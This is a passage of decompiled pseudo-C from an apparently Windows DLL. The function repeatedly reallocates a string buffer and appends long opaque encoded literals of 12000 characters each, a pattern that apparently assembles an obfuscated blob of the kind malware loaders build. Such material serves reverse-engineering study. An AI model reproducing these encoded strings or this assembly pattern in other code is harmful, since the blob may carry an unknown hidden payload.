VV7ksRcGdTGHiT9Tv_RyU15l8HQJdbrbYjlTPsgWcQ4tuXLAPbgaZnfYu3FUVV7scBNA_rR2RD9TdsgmcWbscBMw_nTeBrTeBkdSVRbuYZeLOLnXBht7esgWcX6Nig8BdQKhx_8TMdWVvAYy8jH8BFYQj8eI0FS1NtFMjcAK1deQr7mHkdSVerCMTfH8BlYQj8TFEFSlPNNMjcAZfD7ajlTPkfT0HZjNDerm86hw4p7OEFSRZ2Qy7yFXTdeQrTWHkdSVbbf6sj_snTeSUpTPsAX1T_Ry8hI_unm_QPlHMAn1bOcNzfH8AFYQjL2kFS1NNVMjcAktyhjb7mDkdSVcuWw_jH8BFYQjqPEFS1NtFMjcAIOGhvf7HkdSVVbuuRcGdTGpo_65PcjHdVhlNLa1VTdeQt4LMkGV0GZjNDei3TFe\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 3;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x000180042526;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x000180042526:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.AiCZB3_Uz0FS1BslnjT_ivAzAjzScwF09McgtUJA1tqkHfgWFq2pVV6kUR8E9HR2PAhTPsAffbxWOXRrMBlhy3p7vzR6vfqOtPBFRWRzQj_SS3GnjnxWtXIwdS1eQr4mDlCw_s_kcQdBAs6hw0pja5Hf99UgBL5EURnVBwcXtQR63gsleLxNlboTmrYXGmG6kVdlNN6edTFehXpjMfdSVd8oBLRLh9vfBw9ny76t1BNVBvmxJ7Arcqy7wLuVEHaEHzcAtFR2QL4mFlNwVF4hv3Io_mRuCrRe0i1QVRbufSfoppdfQvgWDuP_VV7kcQdRXjFeKXJjQMgfZd8oBAa6Sg7fNwaKmGf1CtVjD5Vh_YbajtFPkHTEHYgZ8j_9ER2DPCkwQXZEHbuYQdI_jzILj1T1sD0VF7u8nDsVkBHGQO_Y2eHdc5ED9XPbKyEnbY5wnZr7Y69DcARvGZBhsThGxSVRbscBNEPbpbO1BRPgnXlVHgqDcAdfYaZgdDRkFS7VskJDOLORVmtd549JC7VpTfDlTZ2_C3RLYfGnnrkfBg7Z0UQm1mz9TQV2YegoNDfBGRVqRP43GnVC1BJBAJjPisTfNhtn74CtoJkhEAeXqzFew3t3DpqHVV7kcBMwARmhvb4fGnFGT_m_tXMkRfZ4Qj_SSmViovbA7rxEUQHVBhtntQV2bbZyqTcAPbhbllFRPgnZhhbu3LKRUCryXbh4aqr6pfLTsbfYaZh4VUFSkhpBFEfBdTESyf7SSmVy3ts5n7ZEURFD0z9T_y12dVXkQBMg8DBAQrQXGmHbEXpF83MkRfMHBReUOmU6ATw283MkXaDiVUqUemVqPAqXePBEURFw9T9T_yV2dU7kcBMgozJeQr4XGmF6015l9VskVTvfNhtzgB0VdUhEBeJMRVyXN3FsoWcW5W_I_PvhNgA7ZbQV2dZ_YNDfBGRVQP4_GmFflDJBFDCLORVtd549JC7VpSk3TGJORVw0t3Hl44Xl7ucBMg_HV6YrQfGnnZUXpW_HaJPTWZBhtzVxZSVd8hEBclMzFeyXt3HoCyV9chEBeBARVZSNaPsoWcX7scBMgPbKaWvyf8gnbCXptvWMkZWYWwdMDdsrucd5lNDczp3jVmnfaQmVyvQ3bNDcztXnXBhtvdspXKDNnNPBEUQmx3j9TdsSSWtvXNDcAsnV6dnZUPkHqmJKpLxMUQWpo4YBu0sIlLRmvWMkQYuKanKRvw12YaD4S06BARVqN4PRlMAmcWqqwcPTsnV6cuiJPkHTIXpV6eMN7AqZg_U9z_31CpBBBObecrfDhtjyy4yod8REAd50UGqhXt3ViGzVV7keBNoZJMdaFQXGil83BpBXLZEUVneEMCs_y12PVvkQBNoZIiVRrQXGinZEXpVv3MkQdmr2D9TdshX7zJnNHuLsgKMCrSYdsoOcT4tt_NQKnmhovMftZ0b3AVtfb5zZXjXOScGdsqHd2JRLxFTXnVHw8atbDbEXpNfb5b3dlg_z9TQSCEJplNPBFoSzkQj_rDqJSVZkg7OXkdTFtvQK4DUFSWtoUNjcASB0qQj9culJQVV5YRq4AdT7aBD5TPnxH615lO7PodTFef46YPkFd0T9nNDc9RdJeQjDXokFSVWPE0DcAerRhQD9TQSW9WFlNLZ1sVIwYt_Se4UBh6Ga9VLEebArhmDzf0OVEJ5w5DcA9HSeDnZTPioXlSHscfe4KHAS7L4m_pQ1216icQdphzFeyXJjyaAa2BOF9d0F_GRuw3pjUK2tqp8IBD9rMAE0y3pjvzRitK2dXbxFRXXVD_8XtQdi3guhvXMkVdlo6T9ThlTsVV6MFsj_innXefgWDpVJVV7kQQcmLADw3pjWfutqjUgBEJMAHfNw_r_0_n3htVvXQIzdptQj60rtqpkg_EnRdTEWz2lLcswXtZ8A_DOBAPlBzTNTQRiwZtlNFxFRQ_XBw_Se3Hnql5ltXowhbo_n74mDgOWLYMhv3ow_nyWqib7P0Hq5JVlNN6Zi86h\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 7;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x0001800426b9;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x0001800426b9:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.MKEry3rDvzTCpZq5NfBF_VanQj84e8lE3Bvt9VKIc7AryglEaUSVENJFojcAtFzSTv4skg5ENJuvXKMPbwb6r4msmWeU14tvXMkHbobzrYXGiEa3CpBZHNMPEWy3t3fsoX3dchEALMKHXBhtjtQQq3BpBHLxF8XXVB7_aemVyvexrNjeFtUUrhXrTIzdSVTUgtFyJMLHfN7AaXBSkhsdowsAdVobOkvaeznTICbexyQAMbobOrQGvgnZGPaNeL8AdfYbwns6PkGTMN5otUKAemZ6T_gWRg9JVV6kWU8J9EQmwl1cPgXZECbuYbdI_nzuqifbPkHqVF5lNNwCRvESz6N3DkBSVRfubydJ_kJGC7QoHgjZtgOmPuJIRVOy3N3NhQa3rItt9tgsnRGKl1TPoYXTU_INDdrMCkVy3pL_yxKXZ8ILDCBACnI0AHtQRKGdMg3L5FmfYbWonwPkGTMEZqv3IYtNFdy3pL7yxK1Ct9B1xeXLobWrYWyoYXTTmANDfBGClaw0pLt8tKNUgLL5FnfYbWnovPkHTEEaYlTcA9HRGu6NTPsAXTclRy8iBAClyLDnztQRK3BuV83Lg23FeQodQiz_31BOFB4h_RrArooSsQXKVEE7MizcA9HROswNTPsAnRY8sn2qBMCGWCT9TvzRC1rm7ofBFXYB3Qj_Se2nPB6GatUIoEeovfgWHoccVV7keRdX4sbAyXJzyaDrWV5lNPbqc7gLYr4WHgYHVV7kQReb6KtfhXpLf5xSVZ8ALDvBGClTw0pLbir5lt8QLKzV2fLVByfaemVi3ht1vXMkXbobYnvYc2nZAL7scBMgnVS6Qz8bvYUyCJ2pPtI9t0Gybt3vkFSVRLuqBOQdTFeBrSBcsgOcW7mUBModbgaZh73dpSVZkhEHeP2jFehXt3eqYcVV6icBNoAcJeQoeIVLFOGNWmtXMkHQFmQj8ft9V21V5lNLZ0UVlVizxTcV23V5lNNrzdTHVzhvbPkFSor9O_ubpdvufqznasmXaVV5ltbsk_TFeQmGszRbT4XrtNDcA6igwT77nGslSVV4UPqFaMbrSZrdTPkHZGXoNfLTELdiHnsCs8gnRuUaicBMgV_NeQvgXGmEea15leLzJ9HV6YtzpPkHqykyBHXOLMRVA8izemqQFINcDTCNPC2RHvaemVyPhpBFGqJMRVw0t3Hr0UUF7ucBMg_HV6YvgXGnEoufx18zMkAcjpUfgXGmkdRfPL83MkTUWnnZCUemVyvItlNLZMURG6A4YmvzV2dRgkiEKLMRVy3t3HsoecXbucBMwRvnmW75CJgDbXJkhEBe6gTFew3N3HqNKDjKkUBMge7oSZhk32qYhLdm_vbpc7gSZh_YemVy2FIlN_6JORVw0t3HlAjRlPucBMg_HV6YrQfGnnZUXpW_HaJPDWZBhtzy05SVd8REBdBtA7_w0t3Hl4Ib__ucBMg_HV6YnfQlmRmRbm2B_HMRVWBshTPoYWcVLmtTcAsnV6UkubPkGVEXpxfLMAdfYaZg_3bkFSHdW0tXskRVUFpuLSemViwtdlNLZ0UQES6tCOtQV2ZdchEAfHMRUeuj7AcoZWcX09sETHMRVmcLjEoIYWcRZHbBtosnV6cutBPkGTMXpVNvZsUQFRw3t3DstkVV7kQBMwyEpVQrQXGnHbEXpVv3skTboaZn9g9shYkhpBBLnedTHfBhtjajJSVTUhEAdu_HV6cr4nGnF5N8Rlv3MkRbgaZg_YcmUa3lpBB_4_LnWyrYZOoYWcW7aiDcAtF16cjOSUmViWdUpEAf3lPC0R7YHGnGTOXpVPrZ0UQFpDzRTtQV2ZdchEAdI9vV2gfMbva0qGNW13DuZdTGZBhsL0jRSVZkhEGs28DFehXt3XsAOVV6icBNk9BBeQvgXGgVEjV5ljAjFUHKfJhsXOsoecRqS1YvCEPg9VXtxV2Ed8REHOtTTFehbt3pkFSVWEoNDeBwRXGQj9TanaAcNXpEK8AdTGpoxSZ76hRn5MMr6MUale\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0xf;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x00018004284c;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x00018004284c:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.O8hvfjWrkBSVcrTNDe49o_bbYvGnHT0M5kNDdd_86hw7rDP0FSYqKay7a15TBeQkOPNkGV0MZkNDccZzFeybLLP0FSor_d9ekxQPC0RrbGpkBSVd_QrDYAdaHIQzUu8lTVV4ytjcA_rzWQz9TyaDq8B9_kPbqcbjLyj5TPoD_3V9lNDTB0LlfQj9ev8zaVF5lmmbPe7Dryj5TPua2mVCisbcBdTFX0T9TtczSVF5lw9Yrv4n_4p_z76hRn5MMb6N9TBeQr7evkBSVaAGjECLLFfQjk34C4UNfwtDYAdbDbwj5TPpSjqqHkgbcBdTHMd2JRtcTSVF5lcLyF_TBeQrTGpkBSVdXopDYAdbgaZhcbswV2BRbscBMgnUdaQj_W_k7WE6Cay480qTFeqyGuwb7qug5lNAph1jFeTbt_wL6tvFeYy8jMuf0WwdN7QV2XUqzNDcztX3Vg3faemVekhpBBEEVdTHfDhtjx4admt8REAcrDvRyXt3DsgWcW6icBNA6TgccvhXGpsA9AGicBM4uet3BvgXGgmJB28l83MkRUZXQj_SemVir75lNLZMUQGtyCf7_y12ZVbkQBMwS4X3QrQXGnHbEXpVv3skTboaZn9g9vmfmZKpdb4IsnV6cr3HPkHZGXpVw9bBnzLXFhtjvzV2ZTI7XlGBMRVuS3JTPsoWcW7oOPcDvLgSZg_SSmVi3eUbB7xEUQHXBhtjtQ12HdVhEATINLgWRvgXGnGlYF5ltXMkRVElQj84emViLNchEAe4TEGgrQfGnGltHWv5d4Dv_C3RLYfGnHTEXpVKC0AdbAqZgJ0kFS3hpBBL5EUQEWwft7_Y2emdcxECeJORVWCry_BgnZUBNNNjfHMRUOMNTPoYWcQqzfDcAPbSeTbrLPkFSkhpBfKgJdTGfJhsbO8oecRbde9vEO8a_jzKKm6Tv1rsYBNItFV6CjPScmUaN57MWrZ0UXnewcE9QV2FQraNDeBARUeoImOtcAmcR7LFW4_9EV6Ak3rvPWVEXo11QYAdboSZmk3_jK3w_E9d0E_GV6EoXh0FzN1CpBZNzEdjHVBhsDtQV2FdUhEH_o4mReQnfaO911V14tt_M4Pc6jn8GdsqHd2JFPBFnfVdQjUe632SF5leLzBRvEfxoarGUa3BuV83IQ9PdeQv4LkLTIE6JhkpO9HxOh_RRS8AXRcFMNDeBACG7urIstQRC3Bt183IgEI_yWPgW3qwZEUmicS_KtS0LhXp70gqGXZkgJJnWdTHVDy_rvf_yeqmE9d0D_GROw3JDyNcUO98QJLB7Pl_VBy_ae1HZGEbucRczvXDVg37aNoYXRXWcNDeLOCGpo37Y_2qYhLdm_vbpcLgTUrQeLrazfpS03TTKtNhby3JDvzRCy5U5gvZtZSHfNy92ZUxS3ht1vXIQ_nx2yXqzDYnq0j99snaJPTWZBy_EOUFS1Bt1V93_iroTUsiyFYuDvF2v9d4E_HxOw0pD7BRRyN8QJP16S6DVBy_ae1Ea1ppFafTMuXndrheUemVaV4BlNPBEUT3UiT9TQV2RVZzNDfHMRVKSeRTPoYWcW5IOTcAPbqPk1N3DsAmcW6vMSw9EV6cljNw_HZEXpVvXMkRfYaZn9ktX44klpBr3KlZ_YaZgcqmrJokhpBfK1FayKZBhtj31FSVZ8BEAcP9HV6cmGxwb7TIXpV0lUV7bAqZg_QairC3hpBBL5EUQHVDhtrtQV2FW2tvT3HMRVuXqNTPsAmcW7xQB7MHnV6ch7aemVi1CpBBIStHWDVBhtjtwV2ZdUpEHLcRVtiodqsKJq3BRh83MkRfOGQj_YcmViork3jSJIRVuw3N3DoQ9DKakUBMwfrAqZg9oQjGZ3hpBBL5EUQEWwft7_Q3ZiRfsbz9J_EJOC7YoJgTbHn4wfLzsPbKyIrQWBgXZAB4tv0IwNIhaQz9Te8gBndchEB9J_ELmBrYezqndIF5l83L4NK5eQgyTDZrbEKKicdMH8zFeg1K3OMAnsUZ3NDfHMNEX\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0x1f;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x0001800429df;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x0001800429df:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.9ERO4brhRMoXRdcgzPBFZSxJQjSU1Fc1Bt1QUj_iroTUoc_1cGdMg_MDhXvuPqzyZ_6hU3BN1tUIQjaBAWbQWLsgXtZkgJIosdTHfBy8grr6t1Bt1ULz_iohuQj9TVQRCdtcgJLZ1ZeMOZJnYe1HbEJKicfcddTFeg1qTMIA_lVLmQfd5snROnfVTPioXRSzscSeBACG1YoSZvwxCBWWQvfZlZTXfNyIE6KZkhtF_6kAdbAbYiyNPkHTEH7Cdcj_9HRuXiswcAndUnAMTfHMCksxT9TvwxKqqG6q7ZFbboaQj_Se1md9V5ltUIYRhq53fgWFhKoVV7kQRt8CzWg1J7PcAnfYKVOSaLMBnXBhtjtQRC3BpBHLxFbXXVDx_Ya4HbEXpF3FWfdDEWw_vTPkFSCJ2pfLTsbfYaZh9_vUFSkhpBFKUIdTESyf7SemVyliuay48JvgzTyWt3HrawlLRjvWMkVVoaZh94twV2dd8REBcls_XWw0t3HqNHfYjucBMg_HV6YvgXGnH8E08C8zMkSxV5VfgXGmk4Py2883MkTQ569TeUemVybzFlNLZMUREuwSmu7yV2dTUhEBd9_HV6Yocc0oUc3hJBFMDhtNtby2t3HsAmcX5ow10A_nV6YrYXGmHZGXpNv3MkRQKWA7ZbQV2daheNDfBGRVQb4nGmHE1Vdlv3MkVbgaZh_YcmVq3lpBB_4UHjMZn7adkWVEXpFEhAAdbAqZh_uKJo53hJBFMDhXvuPqzyZ_6hW3BJBFLZEURFfjT9T_yV2dU7kQBMgnbZjrrQXGmHbEXpFfLTEbfKSjvPaamVC3BJBPGJI_t0WwdMTQRKAXxlNPBFbeClQjSU1lb3hN9jL4LQBYSz3KjyaB5nZ6sdxRpNhdiP66OMgfTdUoLMDhtNtdoefPkHbAEZkcS8xMCnVByfae7GVEH4ZPDcAzQguov_SS2ENZq2ftUIg6BYm7_42HkXTIH6PgYl4snRGlnhTPsofTamEH_241rpwO66PYuTvFjseS_BGClcw3JLk6ezJd8gLI7eis7fNyfq9KYikht11EQAdboTUsiyhg6kRCk3jKJICHfBy9ezL6t3hN1w9bBnzXXFy_SS1EsUr1h83IofJ9eQv4Fk6TMHZvtUIosj9YQrQWFsgWcXbucSdE_nRGyXJztwV2dbYNqsj__nSuCryXfhyRmZKpfL5cUSEJCry_HoYWcW6AxzcAsnV6cgb_PkEa3qTkeBMwf8Z8nXfY54A2cW5m9VMkRTvfNhtj719ald8REAetLdvBhXt3ftb3VV6kWBNAf_AyZn9bvzV2FSSTOzeLMRUeyXt3DqkNjqGaDXQIADzVAR8btQ5C3F9W9NwFzTBeQj8btR12bRbm8Bdftv0Wy2N3NhYa1rI1v1I_si2UmtTPnKSkhpBdE7adTGZBhsXa5RSVdchEH9I_jTdQT1TdsSSWtviNDcAsnV6cmcsPkHo16q5QrZEUQEGTz9Tvw12ZVFKDObBGRVuSL4nGnGVHWBl83MkTamgQjSWmVqW58BEA8I9EV6eqRDPOeVEXpRMC8AdbAaZgvklUFS3hpBALoM9fC_QbYfGnXrpQDyabZ0UQXNTC9TtQV2YdUhEALMRVuquljPkEa3FuWNjUA_uIWyfAbtR12NRbm8GdfPc6jrYHGlHbGXptYXLmXndrgUe1kDx15l83IgIteQv4Hk2TOH5mtXIgOEahvb4mHqRGoKGicSeaOTFew3pD5ENSVZ8IJDWBMCF6oMCsvzRCUYyWy_BFbUT_Qj_Ye1mTtV3scSBAClJrbMpvzRKqEkPvLZ1bT9orM0XtQxKEdUgJHLYMleQD_Yc2Ea3kyN1fABdfYbWoeTPkE5EEYsvXIY9HxGvFiqO8AXTe5Ry8iBMCm0N8CsvzRKMgNkzrxNbdklgcCsQRCW5RlNLZ1ZURFri44e1Fx3Bt1tXoQ0sfMCb4mLiUdpyWicS8hrDFew3JLy7a4q98gLHPHis6fLydWvzRKw1uVM3OLMCnV\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0x3f;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x000180042b72;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x000180042b72:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  